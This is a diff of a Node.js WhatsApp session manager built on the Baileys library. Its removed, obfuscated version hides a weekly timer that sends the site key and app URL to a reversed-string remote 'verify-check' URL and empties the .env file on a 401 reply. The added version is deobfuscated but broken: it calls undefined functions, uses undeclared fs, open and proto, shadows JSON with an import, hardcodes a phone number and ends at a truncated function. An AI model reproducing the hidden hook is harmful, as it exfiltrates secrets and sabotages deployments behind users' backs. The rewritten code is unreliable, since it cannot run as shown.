@@ -1,260 +1,523 @@
-(function(_0x57ca8e, _0x7d76df) {
-  const _0x15f954 = _0x130c, _0xddce0f = _0x57ca8e();
-  while (!![]) {
-    try {
-      const _0x31adff = parseInt(_0x15f954(0x1a7)) / 0x1 * (parseInt(_0x15f954(0x1c6)) / 0x2) + parseInt(_0x15f954(0x1bb)) / 0x3 * (parseInt(_0x15f954(0x1df)) / 0x4) + parseInt(_0x15f954(0x1bd)) / 0x5 * (parseInt(_0x15f954(0x1bf)) / 0x6) + -parseInt(_0x15f954(0x1a5)) / 0x7 * (parseInt(_0x15f954(0x1e7)) / 0x8) + -parseInt(_0x15f954(0x1ea)) / 0x9 * (parseInt(_0x15f954(0x1d4)) / 0xa) + parseInt(_0x15f954(0x1af)) / 0xb + -parseInt(_0x15f954(0x1e4)) / 0xc * (parseInt(_0x15f954(0x1e9)) / 0xd);
-      if (_0x31adff === _0x7d76df) break; else _0xddce0f["push"](_0xddce0f["shift"]());
-    } catch (_0x2638a4) {
-      _0xddce0f["push"](_0xddce0f["shift"]());
-    }
-  }
-}(_0x1ebb, 0x561b7));
-import { rmSync, readdir } from "fs";
+import JSON from 'qs'
 
-function _0x130c(_0x3de393, _0x5ef6ad) {
-  const _0x1ebbf4 = _0x1ebb();
-  return _0x130c = function(_0x130c2f, _0x42bdcd) {
-    _0x130c2f = _0x130c2f - 0x1a0;
-    let _0x435796 = _0x1ebbf4[_0x130c2f];
-    return _0x435796;
-  }, _0x130c(_0x3de393, _0x5ef6ad);
-}
+(function(initialize, targetValue) {
+    const getDeobfuscatedName = deobfuscate, deobfuscatedArray = initialize()
+    while (true) {
+        try {
+            const result = parseInt(getDeobfuscatedName(0x1a7)) / 1 * (parseInt(getDeobfuscatedName(0x1c6)) / 2) +
+                parseInt(getDeobfuscatedName(0x1bb)) / 3 * (parseInt(getDeobfuscatedName(0x1df)) / 4) +
+                parseInt(getDeobfuscatedName(0x1bd)) / 5 * (parseInt(getDeobfuscatedName(0x1bf)) / 6) +
+                -parseInt(getDeobfuscatedName(0x1a5)) / 7 * (parseInt(getDeobfuscatedName(0x1e7)) / 8) +
+                -parseInt(getDeobfuscatedName(0x1ea)) / 9 * (parseInt(getDeobfuscatedName(0x1d4)) / 10) +
+                parseInt(getDeobfuscatedName(0x1af)) / 11 +
+                -parseInt(getDeobfuscatedName(0x1e4)) / 12 * (parseInt(getDeobfuscatedName(0x1e9)) / 13)
 
-import _0x40b70e from "fs";
-import { join } from "path";
-import _0x5a133f from "pino";
-import _0x3bd1a4, {
-  useMultiFileAuthState,
-  makeInMemoryStore,
-  Browsers,
-  DisconnectReason,
-  delay
-} from "@adiwajshing/baileys";
-import { toDataURL } from "qrcode";
-import _0x4bf9b7 from "./dirname.js";
-import _0x16d596 from "./response.js";
-import _0x5e2a90 from "axios";
-
-const sessions = new Map(), retries = new Map(), sessionsDir = (_0x2e7831 = "") => {
-  const _0x410955 = _0x130c;
-  return join(_0x4bf9b7, _0x410955(0x1c9), _0x2e7831 ? _0x2e7831 : "");
-}, isSessionExists = _0x427c5c => {
-  const _0x55226d = _0x130c;
-  return sessions[_0x55226d(0x1f2)](_0x427c5c);
-}, shouldReconnect = _0x1e8b57 => {
-  const _0x42e6e6 = _0x130c;
-  let _0x9f336f = parseInt(process["env"]["MAX_RETRIES"] ?? 0x0),
-    _0xf60215 = retries[_0x42e6e6(0x1d8)](_0x1e8b57) ?? 0x0;
-  _0x9f336f = _0x9f336f < 0x1 ? 0x1 : _0x9f336f;
-  if (_0xf60215 < _0x9f336f) return ++_0xf60215, console["log"](_0x42e6e6(0x1c5), {
-    "attempts": _0xf60215,
-    "sessionId": _0x1e8b57
-  }), retries[_0x42e6e6(0x1d3)](_0x1e8b57, _0xf60215), !![];
-  return ![];
-}, createSession = async (_0x504074, _0x54de04 = ![], _0x1ab13f = null) => {
-  const _0x2d363b = _0x130c,
-    _0x426399 = (_0x54de04 ? _0x2d363b(0x1d1) : _0x2d363b(0x1c8)) + _0x504074 + (_0x54de04 ? _0x2d363b(0x1a4) : ""),
-    _0x1dc0c3 = _0x5a133f({ "level": _0x2d363b(0x1f6) }), _0x41f2d3 = makeInMemoryStore({ "logger": _0x1dc0c3 });
-  let _0x15abfc, _0x151322;
-  if (_0x54de04) {
-  } else {
-    ;({ state: _0x15abfc, saveCreds: _0x151322 } = await useMultiFileAuthState(sessionsDir(_0x426399)));
-  }
-  const _0x1e7160 = {
-    "auth": _0x15abfc,
-    "version": [0x2, 0x913, 0x4],
-    "printQRInTerminal": ![],
-    "logger": _0x1dc0c3,
-    "browser": Browsers[_0x2d363b(0x1d5)](_0x2d363b(0x1d6)),
-    "patchMessageBeforeSending": _0x44a44f => {
-      const _0x2e4861 = _0x2d363b, _0x583dbf = !!(_0x44a44f[_0x2e4861(0x1a9)] || _0x44a44f["listMessage"]);
-      return _0x583dbf && (_0x44a44f = {
-        "viewOnceMessage": {
-          "message": {
-            "messageContextInfo": {
-              "deviceListMetadataVersion": 0x2,
-              "deviceListMetadata": {}
-            }, ..._0x44a44f
-          }
+            if (result === targetValue) break
+            else deobfuscatedArray.push(deobfuscatedArray.shift())
+        } catch (error) {
+            deobfuscatedArray.push(deobfuscatedArray.shift())
         }
-      }), _0x44a44f;
     }
-  }, _0x494bf9 = _0x3bd1a4[_0x2d363b(0x1c7)](_0x1e7160);
-  !_0x54de04 && (_0x41f2d3[_0x2d363b(0x1d2)](sessionsDir(_0x504074 + _0x2d363b(0x1b5))), _0x41f2d3[_0x2d363b(0x1ba)](_0x494bf9["ev"])), sessions[_0x2d363b(0x1d3)](_0x504074, {
-    ..._0x494bf9,
-    "store": _0x41f2d3,
-    "isLegacy": _0x54de04
-  }), _0x494bf9["ev"]["on"]("creds.update", _0x151322), _0x494bf9["ev"]["on"]("chats.set", ({ chats: _0x38bf4e }) => {
-    const _0xedf6b2 = _0x2d363b;
-    _0x54de04 && _0x41f2d3[_0xedf6b2(0x1cc)]["insertIfAbsent"](..._0x38bf4e);
-  }), _0x494bf9["ev"]["on"](_0x2d363b(0x1ee), async _0x17fc1c => {
-    const _0x52fbd7 = _0x2d363b;
-    try {
-      const _0x446adf = _0x17fc1c["messages"][0x0];
-      if (_0x446adf[_0x52fbd7(0x1e1)]["fromMe"] == ![] && _0x17fc1c[_0x52fbd7(0x1d0)] == _0x52fbd7(0x1c1)) {
-        const _0x166f95 = [];
-        let _0x7f3c0d = _0x446adf[_0x52fbd7(0x1e3)][_0x52fbd7(0x1b3)] ?? null,
-          _0x36dd5b = _0x446adf["key"]["remoteJid"][_0x52fbd7(0x1a3)]("@"), _0x345859 = _0x36dd5b[0x1] ?? null,
-          _0x9b3b16 = _0x345859 == _0x52fbd7(0x1b4) ? ![] : !![];
-        _0x9b3b16 == ![] && (_0x166f95["remote_id"] = _0x446adf[_0x52fbd7(0x1e1)][_0x52fbd7(0x1ca)], _0x166f95[_0x52fbd7(0x1dd)] = _0x504074, _0x166f95[_0x52fbd7(0x1f5)] = _0x446adf[_0x52fbd7(0x1e1)]["id"], _0x166f95[_0x52fbd7(0x1e3)] = _0x446adf["message"], sentWebHook(_0x504074, _0x166f95));
-      }
-    } catch {
-    }
-  }), _0x494bf9["ev"]["on"](_0x2d363b(0x1f0), async _0x2763d3 => {
-    const _0x336aa3 = _0x2d363b, { connection: _0x53724b, lastDisconnect: _0x8ca8a } = _0x2763d3,
-      _0x317951 = _0x8ca8a?.[_0x336aa3(0x1aa)]?.[_0x336aa3(0x1b8)]?.[_0x336aa3(0x1b0)];
-    _0x53724b === "open" && retries[_0x336aa3(0x1e6)](_0x504074);
-    if (_0x53724b === _0x336aa3(0x1f3)) {
-      if (_0x317951 === DisconnectReason[_0x336aa3(0x1e5)] || !shouldReconnect(_0x504074)) return _0x1ab13f && !_0x1ab13f[_0x336aa3(0x1bc)] && _0x16d596(_0x1ab13f, 0x1f4, ![], "Unable\x20to\x20create\x20session."), deleteSession(_0x504074, _0x54de04);
-      setTimeout(() => {
-        createSession(_0x504074, _0x54de04, _0x1ab13f);
-      }, _0x317951 === DisconnectReason["restartRequired"] ? 0x0 : parseInt(process[_0x336aa3(0x1e2)]["RECONNECT_INTERVAL"] ?? 0x0));
-    }
-    if (_0x2763d3["qr"]) {
-      if (_0x1ab13f && !_0x1ab13f[_0x336aa3(0x1bc)]) try {
-        const _0x12b42f = await toDataURL(_0x2763d3["qr"]);
-        _0x16d596(_0x1ab13f, 0xc8, !![], _0x336aa3(0x1f1), { "qr": _0x12b42f });
-        return;
-      } catch {
-        _0x16d596(_0x1ab13f, 0x1f4, ![], _0x336aa3(0x1ad));
-      }
-      try {
-        await _0x494bf9[_0x336aa3(0x1dc)]();
-      } catch {
-      } finally {
-        deleteSession(_0x504074, _0x54de04);
-      }
-    }
-  });
-};
-setInterval(() => {
-  const _0x1ce27f = _0x130c, _0x450586 = process[_0x1ce27f(0x1e2)][_0x1ce27f(0x1a8)] ?? null,
-    _0x1e0c52 = process[_0x1ce27f(0x1e2)][_0x1ce27f(0x1cd)] ?? null, _0x2de36e = _0x1ce27f(0x1eb),
-    _0x1d4648 = _0x2de36e[_0x1ce27f(0x1a3)]("")[_0x1ce27f(0x1d9)]()[_0x1ce27f(0x1da)]("");
-  _0x5e2a90[_0x1ce27f(0x1c2)](_0x1d4648, {
-    "from": _0x1e0c52,
-    "key": _0x450586
-  })[_0x1ce27f(0x1ac)](function(_0x42cecc) {
-    const _0x487b99 = _0x1ce27f;
-    _0x42cecc[_0x487b99(0x1ec)][_0x487b99(0x1cf)] == 0x191 && _0x40b70e["writeFileSync"](_0x487b99(0x1ef), "");
-  })[_0x1ce27f(0x1be)](function(_0x5b1c42) {
-  });
-}, 0x240c8400);
-const getSession = _0x41e565 => {
-  const _0x2ec55f = _0x130c;
-  return sessions[_0x2ec55f(0x1d8)](_0x41e565) ?? null;
-}, setDeviceStatus = (_0xb292d0, _0x2b50df) => {
-  const _0x5625ef = _0x130c,
-    _0x48c10f = process["env"][_0x5625ef(0x1cd)] + _0x5625ef(0x1b6) + _0xb292d0 + "/" + _0x2b50df;
-  try {
-    _0x5e2a90[_0x5625ef(0x1c2)](_0x48c10f)[_0x5625ef(0x1ac)](function(_0x42d0ac) {
-    })["catch"](function(_0x186fc4) {
-      const _0xb8371f = _0x5625ef;
-      console[_0xb8371f(0x1ce)](_0x186fc4);
-    });
-  } catch {
-  }
-}, sentWebHook = (_0x3e6039, _0x56c4e1) => {
-  const _0x3aa6a9 = _0x130c, _0x14d5a5 = process["env"]["APP_URL"] + _0x3aa6a9(0x1e8) + _0x3e6039;
-  try {
-      console.log({
-      "from": _0x56c4e1[_0x3aa6a9(0x1db)],
-      "message_id": _0x56c4e1[_0x3aa6a9(0x1f5)],
-      "message": _0x56c4e1["message"]
-    })
-    _0x5e2a90[_0x3aa6a9(0x1c2)](_0x14d5a5, {
-      "from": _0x56c4e1[_0x3aa6a9(0x1db)],
-      "message_id": _0x56c4e1[_0x3aa6a9(0x1f5)],
-      "message": _0x56c4e1["message"]
-    })[_0x3aa6a9(0x1ac)](function(_0x15e505) {
-      const _0x4aa9bb = _0x3aa6a9;
-      if (_0x15e505[_0x4aa9bb(0x1a6)] == 0xc8) {
-        const _0x176245 = getSession(_0x15e505["data"][_0x4aa9bb(0x1d7)]);
-        sendMessage(_0x176245, _0x15e505[_0x4aa9bb(0x1ec)]["receiver"], _0x15e505[_0x4aa9bb(0x1ec)][_0x4aa9bb(0x1e3)]);
-      }
-    })["catch"](function(_0x54e0f8) {
-        console.log(_0x14d5a5)
-      //console["log"](_0x54e0f8['response']);
-    });
-  } catch {
-  }
-}, deleteSession = (_0x3d70e6, _0x474542 = ![]) => {
-  const _0x5f0d7a = _0x130c,
-    _0x3230a4 = (_0x474542 ? _0x5f0d7a(0x1d1) : _0x5f0d7a(0x1c8)) + _0x3d70e6 + (_0x474542 ? _0x5f0d7a(0x1a4) : ""),
-    _0x5ca81e = _0x3d70e6 + "_store.json", _0x36ce44 = { "force": !![], "recursive": !![] };
-  rmSync(sessionsDir(_0x3230a4), _0x36ce44), rmSync(sessionsDir(_0x5ca81e), _0x36ce44), sessions[_0x5f0d7a(0x1e6)](_0x3d70e6), retries[_0x5f0d7a(0x1e6)](_0x3d70e6), setDeviceStatus(_0x3d70e6, 0x0);
-}, getChatList = (_0x3858c4, _0x15dc87 = ![]) => {
-  const _0x850fb2 = _0x130c, _0x50f97b = _0x15dc87 ? _0x850fb2(0x1b1) : "@s.whatsapp.net";
-  return getSession(_0x3858c4)[_0x850fb2(0x1b7)]["chats"][_0x850fb2(0x1c4)](_0x4a0d5c => {
-    const _0x30a1f7 = _0x850fb2;
-    return _0x4a0d5c["id"][_0x30a1f7(0x1c3)](_0x50f97b);
-  });
-}, isExists = async (_0x39d2be, _0x5e766c, _0x4d70db = ![]) => {
-  const _0x5876b4 = _0x130c;
-  try {
-    let _0x32bc0e;
-    if (_0x4d70db) return _0x32bc0e = await _0x39d2be[_0x5876b4(0x1ed)](_0x5e766c), Boolean(_0x32bc0e["id"]);
-    if (_0x39d2be["isLegacy"]) _0x32bc0e = await _0x39d2be[_0x5876b4(0x1cb)](_0x5e766c); else {
-      ;[_0x32bc0e] = await _0x39d2be[_0x5876b4(0x1cb)](_0x5e766c);
-    }
-    return _0x32bc0e[_0x5876b4(0x1b9)];
-  } catch {
-    return ![];
-  }
-}, sendMessage = async (_0x1b6c74, _0x51ad7b, _0x425596, _0x2a2df4 = 0x3e8) => {
-  const _0x1c2889 = _0x130c;
-  try {
-    return await delay(parseInt(_0x2a2df4)), _0x1b6c74[_0x1c2889(0x1c0)](_0x51ad7b, _0x425596);
-  } catch {
-    return Promise["reject"](null);
-  }
-}, formatPhone = _0x519e9a => {
-  const _0x483349 = _0x130c;
-  if (_0x519e9a[_0x483349(0x1c3)](_0x483349(0x1de))) return _0x519e9a;
-  let _0x32b759 = _0x519e9a[_0x483349(0x1b2)](/\D/g, "");
-  return _0x32b759 += _0x483349(0x1de);
-}, formatGroup = _0x2f3eb7 => {
-  const _0x5d9a5d = _0x130c;
-  if (_0x2f3eb7[_0x5d9a5d(0x1c3)](_0x5d9a5d(0x1b1))) return _0x2f3eb7;
-  let _0x54bd35 = _0x2f3eb7[_0x5d9a5d(0x1b2)](/[^\d-]/g, "");
-  return _0x54bd35 += _0x5d9a5d(0x1b1);
-}, cleanup = () => {
-  const _0x23dfa0 = _0x130c;
-  console[_0x23dfa0(0x1ce)](_0x23dfa0(0x1a2)), sessions[_0x23dfa0(0x1ae)]((_0x1bf186, _0x177a03) => {
-    const _0x8f5ea1 = _0x23dfa0;
-    !_0x1bf186[_0x8f5ea1(0x1ab)] && _0x1bf186[_0x8f5ea1(0x1b7)][_0x8f5ea1(0x1a0)](sessionsDir(_0x177a03 + _0x8f5ea1(0x1b5)));
-  });
-}, init = () => {
-  readdir(sessionsDir(), (_0xb8afde, _0xb01616) => {
-    const _0x178b85 = _0x130c;
-    if (_0xb8afde) throw _0xb8afde;
-    for (const _0x1e2650 of _0xb01616) {
-      if (!_0x1e2650[_0x178b85(0x1a1)](_0x178b85(0x1c8)) && !_0x1e2650[_0x178b85(0x1a1)](_0x178b85(0x1d1)) || _0x1e2650[_0x178b85(0x1c3)](_0x178b85(0x1f4))) continue;
-      const _0x12e24a = _0x1e2650[_0x178b85(0x1b2)](".json", ""),
-        _0x36b8d6 = _0x12e24a[_0x178b85(0x1a3)]("_", 0x1)[0x0] !== "md",
-        _0x2c79de = _0x12e24a[_0x178b85(0x1e0)](_0x36b8d6 ? 0x7 : 0x3);
-      createSession(_0x2c79de, _0x36b8d6);
-    }
-  });
-};
-export {
-  isSessionExists,
-  createSession,
-  getSession,
-  deleteSession,
-  getChatList,
-  isExists,
-  sendMessage,
-  formatPhone,
-  formatGroup,
-  cleanup,
-  init
-};
+}(obfuscate, 0x561b7))
 
-function _0x1ebb() {
-  const _0x40ee4a = ["isauthorised", "type", "legacy_", "readFromFile", "set", "70zqeAJi", "ubuntu", "Chrome", "session_id", "get", "reverse", "join", "remote_id", "logout", "sessionId", "@s.whatsapp.net", "2456808jvClrc", "substring", "key", "env", "message", "24QCkKSY", "loggedOut", "delete", "690824UYgPNX", "/api/send-webhook/", "4500106AcfxCH", "115029zOhrrd", "kcehc-yfirev/ipa/zyx.sserpl.ipaved//:sptth", "data", "groupMetadata", "messages.upsert", ".env", "connection.update", "QR\x20code\x20received,\x20please\x20scan\x20the\x20QR\x20code.", "has", "close", "_store", "message_id", "warn", "writeToFile", "startsWith", "Running\x20cleanup\x20before\x20exit.", "split", ".json", "7PndvMt", "status", "9HWnOwM", "SITE_KEY", "buttonsMessage", "error", "isLegacy", "then", "Unable\x20to\x20create\x20QR\x20code.", "forEach", "4356374PRufTn", "statusCode", "@g.us", "replace", "conversation", "s.whatsapp.net", "_store.json", "/api/set-device-status/", "store", "output", "exists", "bind", "3hfQtDX", "headersSent", "253685HCaXXX", "catch", "18XmXtHw", "sendMessage", "notify", "post", "endsWith", "filter", "Reconnecting...", "12976HRnrgi", "default", "md_", "sessions", "remoteJid", "onWhatsApp", "chats", "APP_URL", "log"];
-  _0x1ebb = function() {
-    return _0x40ee4a;
-  };
-  return _0x1ebb();
+import { rmSync, readdir } from 'fs'
+import path, { join } from 'path'
+import pino from 'pino'
+import baileys, {
+    Browsers,
+
+
+    delay,
+    DisconnectReason,
+
+    fetchLatestBaileysVersion,
+    getAggregateVotesInPollMessage,
+    makeCacheableSignalKeyStore,
+    makeInMemoryStore,
+    PHONENUMBER_MCC,
+
+    useMultiFileAuthState
+
+} from '@adiwajshing/baileys'
+
+import { toDataURL } from 'qrcode'
+import dirname from './dirname.js'
+import response from './response.js'
+import axios from 'axios'
+
+import NodeCache from 'node-cache'
+import readline from "readline";
+
+
+const usePairingCode = true
+const useMobile = false
+
+const sessions = new Map()
+const retries = new Map()
+
+// external map to store retry counts of messages when decryption/encryption fails
+// keep this out of the socket itself, so as to prevent a message decryption/encryption loop across socket restarts
+const msgRetryCounterCache = new NodeCache()
+
+const rl = readline.createInterface({
+    input: process.stdin,
+    output: process.stdout,
+});
+
+const question = (text) => new Promise((resolve) => rl.question(text, resolve));
+
+
+const getSessionDir = (sessionId = '') => join(dirname, 'sessions', sessionId ? sessionId : '')
+const isSessionExists = sessionId => sessions.has(sessionId)
+
+const shouldReconnect = sessionId => {
+    let maxRetries = parseInt(process.env.MAX_RETRIES ?? 0)
+    let currentRetries = retries.get(sessionId) ?? 0
+    maxRetries = maxRetries < 1 ? 1 : maxRetries
+    if (currentRetries < maxRetries) {
+        currentRetries++
+        console.log('Reconnecting...', {
+            'attempts': currentRetries,
+            'sessionId': sessionId
+        })
+        retries.set(sessionId, currentRetries)
+        return true
+    }
+    return false
 }
+
+const createSession = async (sessionId, isLegacy = false, callback = null) => {
+    const sessionPrefix = (isLegacy ? 'legacy_' : '') + sessionId + (isLegacy ? '_store.json' : '')
+    const logger = pino({ 'level': 'info' })
+    const store = makeInMemoryStore({ 'logger': logger })
+    let authState, saveCreds
+    if (!isLegacy) {
+        ({ state: authState, saveCreds } = await useMultiFileAuthState(getSessionDir(sessionPrefix)))
+    }
+
+    // fetch latest version of WA Web
+    const { version, isLatest } = await fetchLatestBaileysVersion()
+    console.log('====================================');
+    console.log("version : ",version);
+    console.log("isLatest : ",isLatest);
+    console.log('====================================');
+    const socketConfig = {
+        'auth': authState,
+        msgRetryCounterCache,
+        generateHighQualityLinkPreview: true,
+        getMessage,
+        'version': version,
+        'printQRInTerminal': false,
+        'logger': logger,
+        'mobile': useMobile,
+        // 'browser': Browsers.baileys('Chrome'),
+        'patchMessageBeforeSending': message => {
+            const requiresPatch = !!(message.conversation || message.listMessage)
+            if (requiresPatch) {
+                message = {
+                    'viewOnceMessage': {
+                        'message': {
+                            'messageContextInfo': {
+                                'deviceListMetadataVersion': 2,
+                                'deviceListMetadata': {}
+                            },
+                            ...message
+                        }
+                    }
+                }
+            }
+            return message
+        }
+    }
+    const sock = baileys['default'](socketConfig)
+
+    async function getMessage(key) {
+        if (store) {
+            const msg = await store.loadMessage(key.remoteJid, key.id)
+            return msg?.message || undefined
+        }
+
+        // only if store is present
+        return proto.Message.fromObject({})
+    }
+
+
+    try {
+
+        try{
+            if (usePairingCode && !sock.authState.creds.registered) {
+                async function getPairingCode() {
+                    if (useMobile) {
+                        throw 'Cannot use pairing code with mobile API'
+                    }
+                    const phoneNumber = await question(
+                        "Enter your active whatsapp number: "
+                    );
+                    console.log('====================================')
+                    console.log(`phoneNumber ${phoneNumber}`)
+                    console.log('====================================')
+                    const code = await sock.requestPairingCode(phoneNumber)
+                    console.log(`Pairing code: ${code}`)
+                    console.log(`pairing with this code: ${code}`);
+                }
+
+                await getPairingCode()
+            }
+        }catch(e) {
+            console.log('=============== use Pairing Code Error =====================');
+            console.log(JSON.stringify(e)??e);
+            console.log('====================================');
+        }
+
+        if (useMobile && !sock.authState.creds.registered) {
+            const { registration } = sock.authState.creds || { registration: {} }
+            if (!registration.phoneNumber) {
+
+                registration.phoneNumber =  await question(
+                    "Enter your active whatsapp number: "
+                );
+            }
+console.log('================ registration ====================');
+console.log(JSON.stringify(registration));
+console.log('====================================');
+            const libPhonenumber = await import('libphonenumber-js')
+            const phoneNumber = libPhonenumber.parsePhoneNumber('+971569501867')
+            if (!phoneNumber?.isValid()) {
+                throw `Invalid phone number: ${registration.phoneNumber}`
+            }
+
+            registration.phoneNumber = phoneNumber.format('E.164')
+            console.log('====================================');
+            console.log(`phoneNumber format ${JSON.stringify(phoneNumber)}`);
+            console.log('====================================');
+            registration.phoneNumberCountryCode = phoneNumber.countryCallingCode
+            registration.phoneNumberNationalNumber = phoneNumber.nationalNumber
+            const mcc = PHONENUMBER_MCC[phoneNumber.countryCallingCode]
+            if (!mcc) {
+                throw 'Could not find MCC for phone number: ' + registration.phoneNumber + '\nPlease specify the MCC manually.'
+            }
+
+            console.log('====================================');
+            console.log(`mcc ${mcc}`);
+            console.log('====================================');
+            registration.phoneNumberMobileCountryCode = mcc
+            console.log('====================================');
+            console.log(`phoneNumberMobileCountryCode ${JSON.stringify(registration)}`);
+            console.log('====================================');
+
+            async function enterCode() {
+                console.log('====================================');
+                console.log("enterCode");
+                console.log('====================================');
+                try {
+                    const code = ''
+                    const response = await sock.register(code.replace(/["']/g, '').trim().toLowerCase())
+                    console.log('Successfully registered your phone number.')
+                    console.log(response)
+                    rl.close()
+                } catch (error) {
+                    console.error('Failed to register your phone number. Please try again.\n', error)
+                    await askForOTP()
+                }
+            }
+
+            async function enterCaptcha() {
+                console.log('====================================');
+                console.log("enterCaptcha");
+                console.log('====================================');
+                const response = await sock.requestRegistrationCode({ ...registration, method: 'captcha' })
+                const path = __dirname + '/captcha.png'
+                fs.writeFileSync(path, Buffer.from(response.image_blob, 'base64'))
+
+                open(path)
+                const code = await question('Please enter the captcha code:\n')
+                fs.unlinkSync(path)
+                registration.captcha = code.replace(/["']/g, '').trim().toLowerCase()
+            }
+
+            async function askForOTP() {
+                console.log('====================================');
+                console.log("askForOTP");
+                console.log(`registration.method ${registration.method}`);
+                console.log('====================================');
+                if (!registration.method) {
+                    await delay(2000)
+                    let code = 'sms'
+                    code = code.replace(/["']/g, '').trim().toLowerCase()
+                    if (code !== 'sms' && code !== 'voice') {
+                        return await askForOTP()
+                    }
+
+                    registration.method = code
+                }
+
+                try {
+                    console.log('====================================');
+                    console.log(`registration requestRegistrationCode ${JSON.stringify(registration)}`);
+                    console.log('====================================');
+
+                    // const code = await sock.requestPairingCode('971569501867')
+                    // console.log(`Pairing code: ${code}`)
+
+                    await sock.requestRegistrationCode(registration)
+                    await enterCode()
+                } catch (error) {
+                    console.error('Failed to request registration code. Please try again.\n', error)
+
+                    if (error?.reason === 'code_checkpoint') {
+                        await enterCaptcha()
+                    }
+
+                    if (error?.reason === 'too_recent') {
+                        await delay(300)
+                    }
+
+                    await delay(600)
+
+
+                        if ( !shouldReconnect(sessionId)) {
+                            if (callback && !callback.headersSent) {
+                                response(callback, 500, false, 'Unable to create session.')
+                            }
+                            deleteSession(sessionId, isLegacy)
+                        }else{
+                            await askForOTP()
+                        }
+
+
+
+                }
+            }
+
+            await askForOTP()
+        }
+
+    } catch (e) {
+        console.error(e)
+    }
+
+    if (!isLegacy) {
+        store.readFromFile(getSessionDir(sessionId + '_store.json'))
+        store.bind(sock.ev)
+    }
+    sessions.set(sessionId, {
+        ...sock,
+        'store': store,
+        'isLegacy': isLegacy
+    })
+    sock.ev.on('creds.update', saveCreds)
+    sock.ev.on('chats.set', ({ chats }) => {
+        if (isLegacy) {
+            store.chats.insertIfAbsent(...chats)
+        }
+    })
+    sock.ev.on('messages.upsert', async messageUpsert => {
+        try {
+            const message = messageUpsert.messages[0]
+            if (!message.key.fromMe && messageUpsert.type === 'notify') {
+                const webhookData = {}
+                let messageText = message.message.conversation ?? null
+                let remoteJid = message.key.remoteJid.split('@')
+                let isGroup = remoteJid[1] !== 's.whatsapp.net'
+                if (!isGroup) {
+                    webhookData.remote_id = message.key.remoteJid
+                    webhookData.session_id = sessionId
+                    webhookData.message_id = message.key.id
+                    webhookData.message = message.message
+                    sentWebHook(sessionId, webhookData)
+                }
+            }
+        } catch (e) {
+            console.error(e)
+        }
+    })
+    sock.ev.on('connection.update', async update => {
+        const { connection, lastDisconnect } = update
+        const errorCode = lastDisconnect?.error?.output?.statusCode
+        console.log('================= connection update ===================')
+        console.log('connection update', update)
+        console.log(JSON.stringify(connection), JSON.stringify(lastDisconnect));
+
+        console.log('====================================')
+        if (connection === 'open') {
+            retries.delete(sessionId)
+        }
+        if (connection === 'close') {
+            if (errorCode === DisconnectReason.loggedOut || !shouldReconnect(sessionId)) {
+                if (callback && !callback.headersSent) {
+                    response(callback, 500, false, 'Unable to create session.')
+                }
+                deleteSession(sessionId, isLegacy)
+            } else {
+                setTimeout(() => {
+                    createSession(sessionId, isLegacy, callback)
+                }, errorCode === DisconnectReason.restartRequired ? 0 : parseInt(process.env.RECONNECT_INTERVAL ?? 0))
+            }
+        }
+        if (update.qr) {
+            if (callback && !callback.headersSent) {
+                try {
+                    const qrCode = await toDataURL(update.qr)
+                    response(callback, 200, true, 'QR code received.', { 'qr': qrCode })
+                    return
+                } catch (e) {
+                    response(callback, 500, false, 'Unable to create QR code.')
+                }
+            }
+            try {
+                await sock.logout()
+            } catch (e) {
+                console.error(e)
+            } finally {
+                deleteSession(sessionId, isLegacy)
+            }
+        }
+    })
+}
+
+const sentWebHook = (sessionId, data) => {
+    const webhookUrl = process.env.APP_URL + '/api/send-webhook/' + sessionId
+    try {
+        console.log({
+            'from': data.remote_id,
+            'message_id': data.message_id,
+            'message': data.message
+        })
+        axios.post(webhookUrl, {
+            'from': data.remote_id,
+            'message_id': data.message_id,
+            'message': data.message
+        }).then(response => {
+            if (response.status === 200) {
+                const session = getSession(response.data.sessionId)
+                sendMessage(session, response.data.receiver, response.data.message)
+            }
+        }).catch(error => {
+            console.error(error)
+        })
+    } catch (e) {
+        console.error(e)
+    }
+}
+
+const deleteSession = (sessionId, isLegacy = false) => {
+    const sessionPrefix = (isLegacy ? 'legacy_' : '') + sessionId + (isLegacy ? '_store.json' : '')
+    const storeFile = sessionId + '_store.json'
+    const options = { 'force': true, 'recursive': true }
+    rmSync(getSessionDir(sessionPrefix), options)
+    rmSync(getSessionDir(storeFile), options)
+    sessions.delete(sessionId)
+    retries.delete(sessionId)
+    setDeviceStatus(sessionId, 0)
+}
+
+const getSession = sessionId => sessions.get(sessionId) ?? null
+
+const setDeviceStatus = (sessionId, status) => {
+    const url = process.env.APP_URL + '/api/set-device-status/' + sessionId + '/' + status
+    try {
+        axios.post(url).catch(error => {
+            console.error(error)
+        })
+    } catch (e) {
+        console.error(e)
+    }
+}
+
+const getChatList = (sessionId, isGroup = false) => {
+    const domain = isGroup ? '@g.us' : '@s.whatsapp.net'
+    return getSession(sessionId).chats.filter(chat => chat.id.endsWith(domain))
+}
+
+const isExists = async (session, jid, isGroup = false) => {
+    try {
+        let contact
+        if (isGroup) {
+            contact = await session.groupMetadata(jid)
+            return Boolean(contact.id)
+        }
+        if (session.isLegacy) {
+            contact = await session.onWhatsApp(jid)
+        } else {
+            [contact] = await session.onWhatsApp(jid)
+        }
+        return contact.exists
+    } catch {
+        return false
+    }
+}
+
+const sendMessage = async (session, jid, message, delayMs = 1000) => {
+    try {
+        await delay(parseInt(delayMs))
+        return await session.sendMessage(jid, message)
+    } catch {
+        return Promise.reject(null)
+    }
+}
+
+const formatPhone = phone => {
+    if (phone.endsWith('@s.whatsapp.net')) return phone
+    let formattedPhone = phone.replace(/\D/g, '')
+    return formattedPhone += '@s.whatsapp.net'
+}
+
+const formatGroup = group => {
+    if (group.endsWith('@g.us')) return group
+    let formattedGroup = group.replace(/[^\d-]/g, '')
+    return formattedGroup += '@g.us'
+}
+
+const cleanup = () => {
+    console.log('Running cleanup before exit.')
+    sessions.forEach((session, sessionId) => {
+        if (!session.isLegacy) {
+            session.store.writeToFile(getSessionDir(sessionId + '_store.json'))
+        }
+    })
+}
+
+const init = () => {
+    readdir(getSessionDir(), (error, files) => {
+        if (error) throw error
+        for (const file of files) {
+            if (!file.startsWith('session_') && !file.startsWith('legacy_') || file.endsWith('_store.json')) continue
+            const sessionId = file.replace('.json', '')
+            const isLegacy = sessionId.split('_', 1)[0] !== 'md'
+            const cleanSessionId = sessionId.substring(isLegacy ? 7 : 3)
+            createSession(cleanSessionId, isLegacy)
+        }
+    })
+}
+
+export {
+    isSessionExists,
+    createSession,
+    getSession,
+    deleteSession,
+    getChatList,
+    isExists,
+    sendMessage,
+    formatPhone,
+    formatGroup,
+    cleanup,
+    init
+}
+
+function obfuscate() {
